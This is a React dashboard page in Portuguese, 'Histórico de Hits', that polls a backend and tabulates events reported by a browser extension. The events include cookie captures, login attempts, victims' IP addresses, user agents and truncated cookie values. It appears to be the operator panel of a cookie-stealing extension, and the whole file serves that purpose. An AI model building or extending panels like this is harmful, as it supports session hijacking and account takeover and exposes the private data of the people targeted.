import { useAuth } from "@/_core/hooks/useAuth";
import DashboardLayout from "@/components/DashboardLayout";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from "@/components/ui/card";
import {
  Table,
  TableBody,
  TableCell,
  TableHead,
  TableHeader,
  TableRow,
} from "@/components/ui/table";
import { Badge } from "@/components/ui/badge";
import { trpc } from "@/lib/trpc";
import { RefreshCw } from "lucide-react";
import { useState } from "react";

export default function Hits() {
  const [anonymousMode, setAnonymousMode] = useState(false);
  
  const { data: hits, isLoading, refetch } = trpc.hits.list.useQuery(
    { limit: 100 },
    { refetchInterval: 10000 } // Refresh every 10 seconds
  );

  const eventTypeColors: Record<string, string> = {
    cookie_capture: "bg-green-500/10 text-green-400 border-green-500/20",
    login_attempt: "bg-blue-500/10 text-blue-400 border-blue-500/20",
    extension_open: "bg-purple-500/10 text-purple-400 border-purple-500/20",
    click: "bg-yellow-500/10 text-yellow-400 border-yellow-500/20",
  };

  const eventTypeLabels: Record<string, string> = {
    cookie_capture: "Captura de Cookie",
    login_attempt: "Tentativa de Login",
    extension_open: "Abertura da Extensão",
    click: "Clique",
  };

  return (
    <DashboardLayout>
      <div className="space-y-6">
        {/* Header */}
        <div className="flex items-center justify-between">
          <div>
            <h1 className="text-3xl font-bold tracking-tight bg-gradient-to-r from-purple-400 to-blue-400 bg-clip-text text-transparent">
              Histórico de Hits
            </h1>
            <p className="text-muted-foreground mt-1">
              Visualize todos os eventos registrados pela extensão
            </p>
          </div>
          <Button
            onClick={() => refetch()}
            variant="outline"
            className="gap-2"
          >
            <RefreshCw className="h-4 w-4" />
            Atualizar
          </Button>
        </div>

        {/* Hits Table */}
        <Card className="border-purple-500/20 bg-card/50 backdrop-blur">
          <CardHeader>
            <CardTitle>Eventos Recentes</CardTitle>
            <CardDescription>
              Últimos 100 eventos registrados em tempo real
            </CardDescription>
          </CardHeader>
          <CardContent>
            {isLoading ? (
              <div className="flex items-center justify-center py-12">
                <div className="animate-spin rounded-full h-8 w-8 border-b-2 border-primary"></div>
              </div>
            ) : hits && hits.length > 0 ? (
              <div className="rounded-md border border-border overflow-hidden">
                <Table>
                  <TableHeader>
                    <TableRow className="bg-muted/50">
                      <TableHead className="font-semibold">ID</TableHead>
                      <TableHead className="font-semibold">Tipo de Evento</TableHead>
                      <TableHead className="font-semibold">Data/Hora</TableHead>
                      <TableHead className="font-semibold">User Agent</TableHead>
                      <TableHead className="font-semibold">IP</TableHead>
                      <TableHead className="font-semibold">Cookie</TableHead>
                    </TableRow>
                  </TableHeader>
                  <TableBody>
                    {hits.map((hit) => (
                      <TableRow key={hit.id} className="hover:bg-muted/30 transition-colors">
                        <TableCell className="font-mono text-xs text-muted-foreground">
                          #{hit.id}
                        </TableCell>
                        <TableCell>
                          <Badge 
                            variant="outline" 
                            className={eventTypeColors[hit.eventType] || ""}
                          >
                            {eventTypeLabels[hit.eventType] || hit.eventType}
                          </Badge>
                        </TableCell>
                        <TableCell className="text-sm">
                          {new Date(hit.timestamp).toLocaleString('pt-BR')}
                        </TableCell>
                        <TableCell className="text-sm text-muted-foreground max-w-[200px] truncate">
                          {anonymousMode ? "***" : (hit.userAgent || "N/A")}
                        </TableCell>
                        <TableCell className="text-sm font-mono">
                          {anonymousMode ? "***" : (hit.ipAddress || "N/A")}
                        </TableCell>
                        <TableCell className="text-sm font-mono max-w-[150px] truncate">
                          {anonymousMode ? "***" : (hit.cookie ? hit.cookie.substring(0, 20) + "..." : "N/A")}
                        </TableCell>
                      </TableRow>
                    ))}
                  </TableBody>
                </Table>
              </div>
            ) : (
              <div className="flex flex-col items-center justify-center py-12 text-center">
                <p className="text-muted-foreground">
                  Nenhum hit registrado ainda
                </p>
                <p className="text-sm text-muted-foreground mt-2">
                  Os eventos aparecerão aqui quando a extensão começar a enviar dados
                </p>
              </div>
            )}
          </CardContent>
        </Card>
      </div>
    </DashboardLayout>
  );
}
